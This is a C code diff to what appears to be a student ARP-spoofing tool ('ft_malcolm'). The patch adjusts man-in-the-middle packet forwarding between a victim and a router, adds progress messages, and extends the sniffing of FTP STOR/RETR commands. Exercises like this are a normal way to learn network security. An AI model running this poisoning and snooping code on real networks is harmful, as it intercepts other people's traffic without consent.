@@ -24,6 +24,7 @@ static void usage(void)
 
 static void cleaning(int socket, struct ifaddrs *ifaddr)
 {
+	printf("Cleaning\n");
 	if (socket > 0)
 		close(socket);
 	if (ifaddr)
@@ -201,21 +202,25 @@ static void arp_restore(int sock, int index, t_session session, t_pair access_po
 static void forwarding(int sock, int index, unsigned char *buffer, ssize_t bytes, t_session session, t_pair victim)
 {
 	struct ethhdr *eth = (struct ethhdr *)buffer;
-	struct sockaddr_ll socket_address;
+
+	if (memcmp(eth->h_source, session.src.mac, 6) == 0) {
+        return;
+    }
 	if (ft_memcmp(eth->h_dest, session.src.mac, 6) == 0)
 	{
 		//SERVER->VICTIM
 		if (ft_memcmp(eth->h_source, session.dst.mac, 6) == 0) {
 			ft_memcpy(eth->h_source, session.src.mac, 6); // MAC attacker
 			ft_memcpy(eth->h_dest, victim.mac, 6);      // MAC victim 
+			send_data(sock, index, buffer, bytes, eth->h_dest);
 		}
 		//VICTIM->SERVER
 		else if (ft_memcmp(eth->h_source, victim.mac, 6) == 0) {
 			ft_memcpy(eth->h_source, session.src.mac, 6); //MAC attacker 
 			ft_memcpy(eth->h_dest, session.dst.mac, 6);   //MAC router 
+			send_data(sock, index, buffer, bytes, eth->h_dest);
 		}
-		ft_memcpy(socket_address.sll_addr, eth->h_dest, 6);
-		send_data(sock, index, buffer, bytes, eth->h_dest);
+		//ft_memcpy(socket_address.sll_addr, eth->h_dest, 6);
 	}
 }
 
@@ -230,9 +235,9 @@ static void snoop_payload(unsigned char *buffer, struct iphdr *ip, ssize_t bytes
 			if (payload_size > 0)
 			{
 				if (ft_memmem(payload, payload_size, "STOR ", 5))
-					printf("\033[1;31m[FT_MALCOLM] DETECTADO 'PUT': %.*s\033[0m", payload_size, payload);
+					printf("\033[1;31m[FT_MALCOLM] DETECTADO 'PUT': %.*s\033[0m \n", payload_size, payload);
 				else if (ft_memmem(payload, payload_size, "RETR ", 5))
-					printf("\033[1;34m[FT_MALCOLM] DETECTADO 'GET': %.*s\033[0m", payload_size, payload);
+					printf("\033[1;34m[FT_MALCOLM] DETECTADO 'GET': %.*s\033[0m \n", payload_size, payload);
 			}
 }
 
@@ -250,6 +255,7 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 	router_session.dst.ip = session.src.ip;
 
 	ft_memcpy(router_session.dst.mac, access_point.mac, 6);
+	printf("Starting poisoning \n");
 
 	while(loop)
 	{
@@ -281,6 +287,8 @@ static void poisoning(int sock, int index, t_session session, t_pair access_poin
 			snoop_payload(buffer, ip, bytes);
 		forwarding(sock, index, buffer, bytes, session, access_point);
 	}
+
+	printf("Restoring ARP Tables \n");
 	arp_restore(sock, index, session, access_point);
 	//CHECK ARP RESTORE
 	// loop = 42;
@@ -296,7 +304,7 @@ static void loop_handler(int sig)
 {
 	loop = 0;
 	(void)sig;
-	printf("\n");
+	printf("\033[0m\n");
 }
 
 int main (int ac, char *av[])
